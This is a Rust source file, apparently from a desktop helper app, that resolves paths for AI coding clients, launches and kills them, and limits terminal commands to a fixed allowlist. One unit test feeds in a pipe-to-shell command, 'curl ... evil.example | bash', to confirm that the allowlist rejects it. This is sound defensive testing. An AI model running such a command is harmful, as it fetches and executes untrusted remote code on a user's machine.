use crate::app_paths::{
    detect_chatgpt_client_path, detect_claude_cli_path, detect_codex_cli_path, get_target_pids,
    get_target_processes, is_target_running, load_app_paths,
};
use std::path::Path;
use std::process::Command;
#[cfg(target_os = "windows")]
use std::process::Stdio;
use std::thread;
use std::time::{Duration, Instant};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

/// 将用户输入、历史配置或自动探测结果规整为可真正启动的路径。
/// Windows 上目录本身不能传给 `Command::new`，否则会得到 os error 5；
/// 对常见安装根目录尝试补齐客户端文件名，其余无效目录交给自动探测自愈。
fn normalize_launch_path(app_type: &str, raw_path: &str) -> Option<String> {
    let trimmed = raw_path.trim();
    if trimmed.is_empty() {
        return None;
    }

    let path = Path::new(trimmed);

    #[cfg(target_os = "windows")]
    {
        if path.is_file() {
            return Some(path.to_string_lossy().to_string());
        }
        if path.is_dir() {
            let executable_names: &[&str] = match app_type {
                "claude" => &["claude.exe", "claude.cmd"],
                "codex" => &["codex.exe", "codex.cmd"],
                "chatgpt" => &["ChatGPT.exe"],
                "workbuddy" => &["WorkBuddyAI.exe", "WorkBuddy.exe"],
                "acciowork" => &["Accio.exe", "AccioWork.exe"],
                "cursor" => &["Cursor.exe"],
                "dsh" => &["DeepSeek Harness.exe"],
                _ => &[],
            };
            for executable_name in executable_names {
                let candidate = path.join(executable_name);
                if candidate.is_file() {
                    return Some(candidate.to_string_lossy().to_string());
                }
            }
        }
        None
    }

    #[cfg(not(target_os = "windows"))]
    {
        // `app_type` is only needed to map installation directories to
        // executable names on Windows. Keep the parameter in the shared
        // signature so callers remain platform-independent without tripping
        // `-D warnings` on Unix/macOS builds.
        let _ = app_type;
        path.exists().then(|| path.to_string_lossy().to_string())
    }
}

/// Roots of the matched process trees, sorted: processes whose parent is not
/// itself a target process (an Electron app's main process, a lone CLI).
fn root_pids(processes: &[(u32, Option<u32>)]) -> Vec<u32> {
    let mut roots: Vec<u32> = processes
        .iter()
        .filter(|(_, parent)| {
            parent.is_none_or(|parent| !processes.iter().any(|(pid, _)| *pid == parent))
        })
        .map(|(pid, _)| *pid)
        .collect();
    roots.sort_unstable();
    roots
}

/// `(pid, parent pid)` of every process below `roots`, sorted by pid — what
/// `taskkill /T` would have reached (node backends, terminal shells, ...).
fn descendant_pids(all: &[(u32, Option<u32>)], roots: &[u32]) -> Vec<(u32, u32)> {
    let mut tree: Vec<u32> = roots.to_vec();
    let mut found: Vec<(u32, u32)> = Vec::new();
    let mut index = 0;
    while index < tree.len() {
        let parent = tree[index];
        let children: Vec<u32> = all
            .iter()
            .filter(|(pid, p)| *p == Some(parent) && !tree.contains(pid))
            .map(|(pid, _)| *pid)
            .collect();
        for pid in children {
            tree.push(pid);
            found.push((pid, parent));
        }
        index += 1;
    }
    found.sort_unstable();
    found
}

fn wait_for_pids_exit(app_type: &str, pids: &[u32], timeout: Duration) -> bool {
    let start = Instant::now();
    loop {
        let alive = get_target_pids(app_type);
        if !pids.iter().any(|pid| alive.contains(pid)) {
            return true;
        }
        if start.elapsed() >= timeout {
            return false;
        }
        thread::sleep(Duration::from_millis(150));
    }
}

/// 安全静默清理目标应用进程树 (CREATE_NO_WINDOW 避免控制台闪烁)
///
/// 只对进程树的根 (Electron 主进程) 发送关闭请求，并且强杀时也先杀根进程：
/// 若先杀掉渲染进程而主进程仍存活，Electron 应用 (如 DeepSeek Harness) 会弹出
/// "renderer exited: killed" 的崩溃对话框。主进程退出后子进程会自行结束，
/// 最后再清理残留。
pub fn kill_app_processes(app_type: &str) -> Result<usize, String> {
    let processes = get_target_processes(app_type);
    let count = processes.len();

    if count == 0 {
        return Ok(0);
    }
    let roots = root_pids(&processes);

    #[cfg(target_os = "windows")]
    let terminate = |pid: u32, force: bool| {
        let pid = pid.to_string();
        let args: &[&str] = if force {
            &["/F", "/PID", &pid]
        } else {
            &["/PID", &pid]
        };
        let _ = Command::new("taskkill")
            .args(args)
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output();
    };
    #[cfg(not(target_os = "windows"))]
    let terminate = |pid: u32, force: bool| {
        let signal = if force { "-9" } else { "-15" };
        let _ = Command::new("kill")
            .args([signal, &pid.to_string()])
            .output();
    };

    // 1. 先请求根进程优雅退出 (Windows: WM_CLOSE / Unix: SIGTERM)
    for pid in &roots {
        terminate(*pid, false);
    }
    if wait_for_pids_exit(app_type, &roots, Duration::from_millis(2500)) {
        // 子进程随主进程退出，稍等其收尾
        let _ = wait_for_pids_exit(
            app_type,
            &get_target_pids(app_type),
            Duration::from_millis(1000),
        );
    } else {
        // 2. 仍存活的根进程单独强杀 (不带 /T)，确保主进程先于渲染进程结束；
        //    先记下整棵进程树，主进程死后再清理它拉起的 node / 终端等子进程
        let tree = descendant_pids(&crate::app_paths::all_process_parents(), &roots);
        let alive = get_target_pids(app_type);
        for pid in roots.iter().filter(|pid| alive.contains(pid)) {
            terminate(*pid, true);
        }
        let _ = wait_for_pids_exit(app_type, &alive, Duration::from_millis(1500));
        // 仍挂在原父进程下的才清理，防止 PID 被系统复用后误杀无关进程
        let now = crate::app_paths::all_process_parents();
        for (pid, parent) in tree {
            if now.contains(&(pid, Some(parent))) {
                terminate(pid, true);
            }
        }
    }

    // 3. 清理残留：此时已没有主进程，不会再触发崩溃对话框
    for pid in get_target_pids(app_type) {
        terminate(pid, true);
    }

    Ok(count)
}

/// 有界轮询等待目标应用完全退出 (最长 timeout_ms 毫秒，每 150ms 轮询一次)
pub fn wait_for_app_exit(app_type: &str, timeout_ms: u64) -> bool {
    let start = Instant::now();
    let timeout = Duration::from_millis(timeout_ms);

    while start.elapsed() < timeout {
        if !is_target_running(app_type) {
            return true;
        }
        thread::sleep(Duration::from_millis(150));
    }

    !is_target_running(app_type)
}

/// 解析目标应用的实际执行路径 (优先级: 手动参数 -> 配置文件 -> 自动探测)
pub fn resolve_app_path(app_type: &str, custom_path: Option<&str>) -> Option<String> {
    if let Some(p) = custom_path {
        if let Some(resolved) = normalize_launch_path(app_type, p) {
            return Some(resolved);
        }
        log::warn!(
            "忽略无法启动的 {} 自定义路径 ({})，改用已保存路径或自动探测",
            app_type,
            p
        );
    }

    let saved = load_app_paths();
    let candidate = match app_type {
        "claude" => saved
            .claude_cli_path
            .as_deref()
            .filter(|p| !p.trim().is_empty())
            .map(|s| s.to_string()),
        "codex" => saved
            .codex_cli_path
            .as_deref()
            .filter(|p| !p.trim().is_empty())
            .map(|s| s.to_string()),
        "chatgpt" => saved
            .chatgpt_client_path
            .as_deref()
            .filter(|p| !p.trim().is_empty())
            .map(|s| s.to_string()),
        "workbuddy" => saved
            .workbuddy_client_path
            .as_deref()
            .filter(|p| !p.trim().is_empty())
            .map(|s| s.to_string()),
        "acciowork" => saved
            .accio_client_path
            .as_deref()
            .filter(|p| !p.trim().is_empty())
            .map(|s| s.to_string()),
        "cursor" => saved
            .cursor_client_path
            .as_deref()
            .filter(|p| !p.trim().is_empty())
            .map(|s| s.to_string()),
        "dsh" => saved
            .dsh_client_path
            .as_deref()
            .filter(|p| !p.trim().is_empty())
            .map(|s| s.to_string()),
        _ => None,
    };

    // 已配置路径必须能规整为真实启动文件；仅“目录存在”不代表可以执行。
    if let Some(ref path_str) = candidate {
        if let Some(resolved) = normalize_launch_path(app_type, path_str) {
            return Some(resolved);
        }
        log::warn!(
            "配置的 {} 路径不可启动 ({})，可能是目录、文件已移动或刚经历版本更新，正在触发自动探测自愈...",
            app_type,
            path_str
        );
    }

    // 路径不存在或未配置：执行动态自动探测与自愈
    let detected = match app_type {
        "claude" => detect_claude_cli_path(),
        "codex" => detect_codex_cli_path(),
        "chatgpt" => detect_chatgpt_client_path(),
        "workbuddy" => crate::app_paths::detect_workbuddy_client_path(),
        "acciowork" => crate::app_paths::detect_accio_client_path(),
        "cursor" => crate::app_paths::detect_cursor_client_path(),
        "dsh" => crate::app_paths::detect_dsh_client_path(),
        _ => return None,
    };

    if detected.exists && !detected.path.is_empty() {
        let Some(detected_path) = normalize_launch_path(app_type, &detected.path) else {
            log::warn!(
                "自动探测到的 {} 路径仍不可启动，已拒绝执行: {}",
                app_type,
                detected.path
            );
            return None;
        };
        // 静默自愈回写配置
        let mut updated = saved;
        if app_type == "chatgpt" {
            updated.chatgpt_client_path = Some(detected_path.clone());
            let _ = crate::app_paths::save_app_paths(&updated);
        } else if app_type == "claude" {
            updated.claude_cli_path = Some(detected_path.clone());
            let _ = crate::app_paths::save_app_paths(&updated);
        } else if app_type == "codex" {
            updated.codex_cli_path = Some(detected_path.clone());
            let _ = crate::app_paths::save_app_paths(&updated);
        } else if app_type == "workbuddy" {
            updated.workbuddy_client_path = Some(detected_path.clone());
            let _ = crate::app_paths::save_app_paths(&updated);
        } else if app_type == "acciowork" {
            updated.accio_client_path = Some(detected_path.clone());
            let _ = crate::app_paths::save_app_paths(&updated);
        } else if app_type == "cursor" {
            updated.cursor_client_path = Some(detected_path.clone());
            let _ = crate::app_paths::save_app_paths(&updated);
        } else if app_type == "dsh" {
            updated.dsh_client_path = Some(detected_path.clone());
            let _ = crate::app_paths::save_app_paths(&updated);
        }
        Some(detected_path)
    } else {
        None
    }
}

/// 拉起目标客户端或 CLI 工具
pub fn launch_app(app_type: &str, custom_path: Option<&str>) -> Result<String, String> {
    let resolved_path = resolve_app_path(app_type, custom_path);
    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
    let _ = &resolved_path;

    match app_type {
        "chatgpt" => {
            // ChatGPT 桌面客户端启动方案
            #[cfg(target_os = "windows")]
            {
                // 如果是 Store 版路径 (WindowsApps)，优先使用微软协议启动或 Shell AppsFolder
                let is_store = resolved_path
                    .as_deref()
                    .map(|p| p.contains("WindowsApps"))
                    .unwrap_or(false);

                if is_store {
                    // 通过 explorer.exe shell:AppsFolder 启动 Store 应用
                    let status = Command::new("cmd")
                        .args([
                            "/c",
                            "start",
                            "",
                            "explorer.exe",
                            "shell:AppsFolder\\OpenAI.Codex_2p2nqsd0c76g0!App",
                        ])
                        .creation_flags(0x08000000)
                        .spawn();

                    if status.is_ok() {
                        return Ok("ChatGPT 桌面客户端已启动 (Windows Store)".to_string());
                    }

                    // 协议降级启动
                    let _ = Command::new("cmd")
                        .args(["/c", "start", "chatgpt:"])
                        .creation_flags(0x08000000)
                        .spawn();

                    return Ok("ChatGPT 桌面客户端已启动 (URI Protocol)".to_string());
                } else if let Some(ref path_str) = resolved_path {
                    let path = Path::new(path_str);
                    if path.exists() {
                        let mut cmd = Command::new(path);
                        if let Some(parent) = path.parent() {
                            cmd.current_dir(parent);
                        }
                        cmd.stdin(Stdio::null())
                            .stdout(Stdio::null())
                            .stderr(Stdio::null());
                        cmd.spawn()
                            .map_err(|e| format!("启动 ChatGPT 客户端失败: {}", e))?;
                        return Ok(format!("ChatGPT 客户端已启动: {}", path_str));
                    }
                }

                Err(
                    "未找到有效的 ChatGPT 桌面客户端路径，请在路径管理中配置或执行自动探测"
                        .to_string(),
                )
            }

            #[cfg(target_os = "macos")]
            {
                let mut cmd = Command::new("open");
                if let Some(ref path_str) = resolved_path {
                    let p = Path::new(path_str);
                    if p.exists() {
                        cmd.arg(path_str);
                    } else {
                        cmd.args(["-a", "ChatGPT"]);
                    }
                } else {
                    cmd.args(["-a", "ChatGPT"]);
                }
                cmd.spawn()
                    .map_err(|e| format!("启动 ChatGPT 客户端失败: {}", e))?;
                Ok("ChatGPT 桌面客户端已启动".to_string())
            }

            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            {
                Err("当前平台不支持自动拉起 ChatGPT 客户端".to_string())
            }
        }
        "claude" => {
            // Claude CLI 终端启动方案
            #[cfg(any(target_os = "windows", target_os = "macos"))]
            let path_str = resolved_path.ok_or_else(|| {
                "未找到 Claude CLI 安装路径，请先在路径管理中配置或执行自动探测".to_string()
            })?;

            #[cfg(target_os = "windows")]
            {
                // 在独立 CMD 窗口中启动 Claude CLI
                let comspec = std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".to_string());
                let mut cmd = Command::new(&comspec);
                cmd.args(["/c", "start", "Claude Code", &comspec, "/k", &path_str]);
                cmd.spawn()
                    .map_err(|e| format!("启动 Claude Code 终端失败: {}", e))?;
                Ok(format!("Claude Code 终端已在独立窗口中拉起 ({})", path_str))
            }

            #[cfg(target_os = "macos")]
            {
                let escaped_path = path_str.replace('\\', "\\\\").replace('"', "\\\"");
                let script = format!(
                    r#"set was_running to application "Terminal" is running
tell application "Terminal"
    if was_running then
        activate
        do script "exec \"{}\""
    else
        launch
        do script "exec \"{}\""
        activate
    end if
end tell"#,
                    escaped_path, escaped_path
                );
                Command::new("osascript")
                    .args(["-e", &script])
                    .spawn()
                    .map_err(|e| format!("启动 Claude Code 终端失败: {}", e))?;
                Ok(format!("Claude Code 终端已在独立窗口中拉起 ({})", path_str))
            }

            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            {
                Err("当前平台不支持自动拉起 Claude CLI".to_string())
            }
        }
        "codex" => {
            // Codex CLI 终端启动方案
            #[cfg(any(target_os = "windows", target_os = "macos"))]
            let path_str = resolved_path.ok_or_else(|| {
                "未找到 Codex CLI 安装路径，请先在路径管理中配置或执行自动探测".to_string()
            })?;

            #[cfg(target_os = "windows")]
            {
                // 在独立 CMD 窗口中启动 Codex CLI (追加 --no-daemon 避免在 Windows 管理员提权环境下触发 Daemon 安全限制)
                let comspec = std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".to_string());
                let mut cmd = Command::new(&comspec);
                cmd.args([
                    "/c",
                    "start",
                    "Codex CLI",
                    &comspec,
                    "/k",
                    &path_str,
                    "--no-daemon",
                ]);
                cmd.spawn()
                    .map_err(|e| format!("启动 Codex CLI 终端失败: {}", e))?;
                Ok(format!("Codex CLI 终端已在独立窗口中拉起 ({})", path_str))
            }

            #[cfg(target_os = "macos")]
            {
                let escaped_path = path_str.replace('\\', "\\\\").replace('"', "\\\"");
                let script = format!(
                    r#"set was_running to application "Terminal" is running
tell application "Terminal"
    if was_running then
        activate
        do script "exec \"{}\" --no-daemon"
    else
        launch
        do script "exec \"{}\" --no-daemon"
        activate
    end if
end tell"#,
                    escaped_path, escaped_path
                );
                Command::new("osascript")
                    .args(["-e", &script])
                    .spawn()
                    .map_err(|e| format!("启动 Codex CLI 终端失败: {}", e))?;
                Ok(format!("Codex CLI 终端已在独立窗口中拉起 ({})", path_str))
            }

            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            {
                Err("当前平台不支持自动拉起 Codex CLI".to_string())
            }
        }

        "workbuddy" => {
            #[cfg(any(target_os = "windows", target_os = "macos"))]
            let path_str = resolved_path.ok_or_else(|| {
                "未找到 WorkBuddy 安装路径，请先在路径管理中配置或执行自动探测".to_string()
            })?;

            #[cfg(target_os = "windows")]
            {
                let path = Path::new(&path_str);
                if path.exists() {
                    let mut cmd = Command::new(path);
                    if let Some(parent) = path.parent() {
                        cmd.current_dir(parent);
                    }
                    cmd.stdin(Stdio::null())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null());
                    cmd.spawn()
                        .map_err(|e| format!("启动 WorkBuddy 客户端失败: {}", e))?;
                    return Ok(format!("WorkBuddy 客户端已启动: {}", path_str));
                }
                Err(format!("WorkBuddy 可执行文件不存在: {}", path_str))
            }

            #[cfg(target_os = "macos")]
            {
                let mut cmd = Command::new("open");
                cmd.arg(&path_str);
                cmd.spawn()
                    .map_err(|e| format!("启动 WorkBuddy 客户端失败: {}", e))?;
                Ok(format!("WorkBuddy 客户端已启动: {}", path_str))
            }

            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            {
                Err("当前平台不支持自动拉起 WorkBuddy 客户端".to_string())
            }
        }

        "acciowork" => {
            #[cfg(any(target_os = "windows", target_os = "macos"))]
            let path_str = resolved_path.ok_or_else(|| {
                "未找到 Accio Work 安装路径，请先在路径管理中配置或执行自动探测".to_string()
            })?;

            #[cfg(target_os = "windows")]
            {
                let path = Path::new(&path_str);
                if path.exists() {
                    let bridge_port = match crate::accio::bridge::get_bridge_port() {
                        Some(port) => port,
                        None => tauri::async_runtime::block_on(async {
                            crate::accio::bridge::start_bridge(None, None).await
                        })
                        .map_err(|e| {
                            format!("Accio 本地网关未能完成监听，已拒绝启动客户端: {e}")
                        })?,
                    };
                    let config = crate::accio::config::load_accio_config();

                    // Accio 不会携带自定义鉴权头，实例凭据以 /i/<token> 路径前缀嵌入其读取的网关地址
                    let gateway_base = crate::accio::bridge::accio_gateway_base_url(bridge_port)
                        .ok_or_else(|| {
                            "本地网关实例凭据未就绪，已拒绝启动 Accio 以免无鉴权放行".to_string()
                        })?;

                    let mut cmd = Command::new(path);
                    cmd.env("GATEWAY_BASE_URL", &gateway_base)
                        .env("ADK_BASE_URL", format!("{gateway_base}/api/adk/llm"))
                        .env("ADK_MODEL", &config.model)
                        .env(
                            "EMBEDDING_BASE_URL",
                            format!("{gateway_base}/api/adk/embedding/embed"),
                        )
                        .env("EMBEDDING_MODEL", "text-embedding-3-small");

                    if let Some(parent) = path.parent() {
                        cmd.current_dir(parent);
                    }
                    cmd.stdin(Stdio::null())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null());
                    cmd.spawn()
                        .map_err(|e| format!("启动 Accio Work 客户端失败: {}", e))?;

                    let launched_at_ms = chrono::Local::now().timestamp_millis();
                    let initial_log_len = dirs::home_dir()
                        .map(|h| h.join(".accio").join("logs").join("sdk.log"))
                        .and_then(|p| std::fs::metadata(p).ok())
                        .map(|m| m.len())
                        .unwrap_or(0);

                    if config.prevent_official_leak {
                        tokio::spawn(async move {
                            verify_accio_gateway_safety(
                                bridge_port,
                                launched_at_ms,
                                initial_log_len,
                            )
                            .await;
                        });
                    }

                    return Ok(format!(
                        "Accio Work 客户端已成功注入本地网关 (127.0.0.1:{}) 并拉起: {}",
                        bridge_port, path_str
                    ));
                }
                Err(format!("Accio Work 可执行文件不存在: {}", path_str))
            }

            #[cfg(target_os = "macos")]
            {
                let bridge_port = match crate::accio::bridge::get_bridge_port() {
                    Some(port) => port,
                    None => tauri::async_runtime::block_on(async {
                        crate::accio::bridge::start_bridge(None, None).await
                    })
                    .map_err(|e| format!("Accio 本地网关未能完成监听，已拒绝启动客户端: {e}"))?,
                };
                let gateway_base = crate::accio::bridge::accio_gateway_base_url(bridge_port)
                    .ok_or_else(|| {
                        "本地网关实例凭据未就绪，已拒绝启动 Accio 以免无鉴权放行".to_string()
                    })?;
                let mut cmd = Command::new("open");
                cmd.arg(&path_str);
                cmd.env("GATEWAY_BASE_URL", &gateway_base);
                cmd.spawn()
                    .map_err(|e| format!("启动 Accio Work 客户端失败: {}", e))?;
                Ok(format!(
                    "Accio Work 客户端已成功注入本地网关 (127.0.0.1:{}) 并拉起: {}",
                    bridge_port, path_str
                ))
            }

            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            {
                Err("当前平台不支持自动拉起 Accio Work 客户端".to_string())
            }
        }
        "cursor" => {
            #[cfg(any(target_os = "windows", target_os = "macos"))]
            let path_str = resolved_path.ok_or_else(|| {
                "未找到 Cursor 安装路径，请先在路径管理中配置或执行自动探测".to_string()
            })?;

            #[cfg(target_os = "windows")]
            {
                let path = Path::new(&path_str);
                if path.exists() {
                    let mut cmd = Command::new(path);
                    if let Some(parent) = path.parent() {
                        cmd.current_dir(parent);
                    }
                    cmd.stdin(Stdio::null())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null());
                    cmd.spawn()
                        .map_err(|e| format!("启动 Cursor 客户端失败: {}", e))?;
                    return Ok(format!("Cursor 客户端已成功拉起: {}", path_str));
                }
                Err(format!("Cursor 可执行文件不存在: {}", path_str))
            }

            #[cfg(target_os = "macos")]
            {
                let mut cmd = Command::new("open");
                cmd.arg(&path_str);
                cmd.spawn()
                    .map_err(|e| format!("启动 Cursor 客户端失败: {}", e))?;
                Ok(format!("Cursor 客户端已成功拉起: {}", path_str))
            }

            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            {
                Err("当前平台不支持自动拉起 Cursor 客户端".to_string())
            }
        }
        "dsh" => {
            #[cfg(any(target_os = "windows", target_os = "macos"))]
            let path_str = resolved_path.ok_or_else(|| {
                "未找到 DeepSeek Harness 安装路径，请先在路径管理中配置或执行自动探测".to_string()
            })?;

            #[cfg(target_os = "windows")]
            {
                let path = Path::new(&path_str);
                if path.exists() {
                    let mut cmd = Command::new(path);
                    if let Some(parent) = path.parent() {
                        cmd.current_dir(parent);
                    }
                    cmd.stdin(Stdio::null())
                        .stdout(Stdio::null())
                        .stderr(Stdio::null());
                    cmd.spawn()
                        .map_err(|e| format!("启动 DeepSeek Harness 失败: {}", e))?;
                    return Ok(format!("DeepSeek Harness 已成功拉起: {}", path_str));
                }
                Err(format!("DeepSeek Harness 可执行文件不存在: {}", path_str))
            }

            #[cfg(target_os = "macos")]
            {
                let mut cmd = Command::new("open");
                cmd.arg(&path_str);
                cmd.spawn()
                    .map_err(|e| format!("启动 DeepSeek Harness 失败: {}", e))?;
                Ok(format!("DeepSeek Harness 已成功拉起: {}", path_str))
            }

            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            {
                Err("当前平台不支持自动拉起 DeepSeek Harness".to_string())
            }
        }
        _ => Err(format!("未知应用类型: {}", app_type)),
    }
}

/// 监控 Accio Work 日志，检测是否漏跑阿里官方网关；若违规直连官方则触发熔断强杀
#[cfg(target_os = "windows")]
pub async fn verify_accio_gateway_safety(
    expected_port: u16,
    launched_at_ms: i64,
    _initial_log_len: u64,
) {
    let Some(home) = dirs::home_dir() else {
        return;
    };
    let sdk_log = home.join(".accio").join("logs").join("sdk.log");
    let expected_gw = format!("127.0.0.1:{}", expected_port);

    for _ in 0..60 {
        tokio::time::sleep(Duration::from_millis(500)).await;
        if !crate::app_paths::is_target_running("acciowork") {
            break;
        }
        if let Ok(metadata) = std::fs::metadata(&sdk_log) {
            let file_size = metadata.len();
            if file_size == 0 {
                continue;
            }

            let read_bytes = file_size.min(512 * 1024) as usize;
            if let Ok(file) = std::fs::File::open(&sdk_log) {
                use std::io::{Read, Seek, SeekFrom};
                let mut reader = std::io::BufReader::new(file);
                if file_size > read_bytes as u64 {
                    let _ = reader.seek(SeekFrom::End(-(read_bytes as i64)));
                }
                let mut buffer = Vec::with_capacity(read_bytes);
                if reader.read_to_end(&mut buffer).is_ok() {
                    let text = String::from_utf8_lossy(&buffer);
                    for line in text.lines().rev() {
                        let trimmed = line.trim();
                        if trimmed.is_empty() {
                            continue;
                        }

                        let line_text =
                            if let Ok(entry) = serde_json::from_str::<serde_json::Value>(trimmed) {
                                if let Some(ts) = entry.get("timestamp").and_then(|t| t.as_i64()) {
                                    if ts < launched_at_ms - 2000 {
                                        continue;
                                    }
                                }
                                entry
                                    .get("message")
                                    .and_then(|m| m.as_str())
                                    .unwrap_or("")
                                    .to_string()
                            } else {
                                trimmed.to_string()
                            };

                        if line_text.contains("[Gateway] Config: gatewayBaseUrl=") {
                            if line_text.contains(&format!("gatewayBaseUrl=http://{}", expected_gw))
                                || line_text.contains(&format!(
                                    "gatewayBaseUrl=http://localhost:{}",
                                    expected_port
                                ))
                                || line_text.contains("gatewayBaseUrl=http://127.0.0.1")
                            {
                                log::info!(
                                    "Accio Work 环境变量注入成功，网关校验合规 (127.0.0.1:{})",
                                    expected_port
                                );
                                return;
                            } else if line_text
                                .contains("gatewayBaseUrl=https://phoenix-gw.alibaba.com")
                            {
                                log::warn!(
                                    "【安全提醒】检测到 Accio Work 可能未加载本地网关环境变量 (直连了官方 gatewayBaseUrl=https://phoenix-gw.alibaba.com)"
                                );
                            }
                        }
                    }
                }
            }
        }
    }
}

/// 重启目标应用 (若正在运行则先杀灭、等待释放，再重新拉起)
pub fn restart_target_app(app_type: &str, custom_path: Option<&str>) -> Result<String, String> {
    let was_running = is_target_running(app_type);
    if was_running {
        let killed_count = kill_app_processes(app_type)?;
        log::info!(
            "正在安全终止目标应用 {} (清理 {} 个进程)...",
            app_type,
            killed_count
        );
        // 最多等待 2.5 秒确保退出
        let exited = wait_for_app_exit(app_type, 2500);
        if !exited {
            log::warn!("应用 {} 未在超时时间内完全退出，继续尝试拉起", app_type);
        }
    }

    // 稍微延迟 100ms 保证句柄释放
    thread::sleep(Duration::from_millis(100));

    // 拉起应用
    let msg = launch_app(app_type, custom_path)?;
    if was_running {
        Ok(format!("旧实例已终止，{}", msg))
    } else {
        Ok(msg)
    }
}

const ALLOWED_TERMINAL_OPS: &[(&str, &str)] = &[
    ("claude_npm", "npm i -g @anthropic-ai/claude-code"),
    ("codex_npm", "npm i -g @openai/codex"),
    ("node_version", "node -v"),
    ("npm_version", "npm -v"),
    (
        "chatgpt_winget",
        "winget install --id=9NT1R1C2HH7J --source=msstore --accept-package-agreements --accept-source-agreements",
    ),
];

pub fn resolve_allowed_terminal_command(input: &str) -> Result<&'static str, String> {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return Err("执行命令不能为空".to_string());
    }
    ALLOWED_TERMINAL_OPS
        .iter()
        .find(|(id, _)| *id == trimmed)
        .map(|(_, cmd)| *cmd)
        .ok_or_else(|| "未授权的终端操作，已拒绝执行任意命令".to_string())
}

/// 在独立控制台终端中执行固定白名单安装命令。
pub fn execute_in_terminal(command: &str) -> Result<String, String> {
    let trimmed = resolve_allowed_terminal_command(command)?;

    #[cfg(target_os = "windows")]
    {
        let comspec = std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".to_string());
        let mut cmd = Command::new(&comspec);
        cmd.args([
            "/c",
            "start",
            "AI Helper - CLI 手动安装与更新终端",
            &comspec,
            "/k",
            trimmed,
        ]);
        cmd.spawn()
            .map_err(|e| format!("拉起外部终端失败: {}", e))?;
        Ok(format!("已在独立终端窗口中启动安装: {}", trimmed))
    }

    #[cfg(target_os = "macos")]
    {
        let escaped_cmd = trimmed.replace('\\', "\\\\").replace('"', "\\\"");
        let script = format!(
            r#"set was_running to application "Terminal" is running
tell application "Terminal"
    if was_running then
        activate
        do script "{}"
    else
        launch
        do script "{}"
        activate
    end if
end tell"#,
            escaped_cmd, escaped_cmd
        );
        Command::new("osascript")
            .args(["-e", &script])
            .spawn()
            .map_err(|e| format!("拉起外部终端失败: {}", e))?;
        Ok(format!("已在终端窗口中启动: {}", trimmed))
    }

    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
    {
        let _ = trimmed;
        Err("当前操作系统暂不支持自动唤起外部终端，请手动复制命令到终端中执行".to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(target_os = "windows")]
    #[test]
    fn client_directories_resolve_to_their_real_executable() {
        let directory = tempfile::tempdir().unwrap();
        for (app_type, executable_name) in [
            ("claude", "claude.cmd"),
            ("codex", "codex.exe"),
            ("chatgpt", "ChatGPT.exe"),
            ("workbuddy", "WorkBuddyAI.exe"),
            ("acciowork", "Accio.exe"),
            ("cursor", "Cursor.exe"),
            ("dsh", "DeepSeek Harness.exe"),
        ] {
            let executable = directory.path().join(executable_name);
            std::fs::write(&executable, b"test").unwrap();
            assert_eq!(
                normalize_launch_path(app_type, directory.path().to_str().unwrap()),
                Some(executable.to_string_lossy().to_string())
            );
            std::fs::remove_file(executable).unwrap();
        }
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn unrelated_directory_is_never_treated_as_an_executable() {
        let directory = tempfile::tempdir().unwrap();
        assert_eq!(
            normalize_launch_path("cursor", directory.path().to_str().unwrap()),
            None
        );
    }

    #[test]
    fn only_process_tree_roots_are_closed_first() {
        // Electron: main 10 spawns renderer 11 and gpu 12; 20 is a second,
        // unrelated instance whose parent (1) is not a target process.
        let processes = [
            (11, Some(10)),
            (10, Some(4)),
            (12, Some(10)),
            (20, Some(1)),
            (30, None),
        ];
        assert_eq!(root_pids(&processes), vec![10, 20, 30]);
        // A child whose main already exited becomes a root of its own.
        assert_eq!(root_pids(&[(11, Some(10))]), vec![11]);
    }

    #[test]
    fn descendants_cover_the_whole_tree_but_nothing_else() {
        // 10 → 11 → 13 (e.g. a shell spawned by a renderer), 10 → 12; 4 and 20 unrelated.
        let all = [
            (10, Some(4)),
            (11, Some(10)),
            (12, Some(10)),
            (13, Some(11)),
            (20, Some(4)),
            (4, None),
        ];
        assert_eq!(
            descendant_pids(&all, &[10]),
            vec![(11, 10), (12, 10), (13, 11)]
        );
        assert!(descendant_pids(&all, &[20]).is_empty());
    }

    #[test]
    fn terminal_ops_accept_only_fixed_commands() {
        assert_eq!(
            resolve_allowed_terminal_command("claude_npm").unwrap(),
            "npm i -g @anthropic-ai/claude-code"
        );
        assert!(resolve_allowed_terminal_command("npm i -g @anthropic-ai/claude-code").is_err());
        assert!(
            resolve_allowed_terminal_command("curl -fsSL https://evil.example | bash").is_err()
        );
        assert!(resolve_allowed_terminal_command("cmd /c calc").is_err());
    }
}
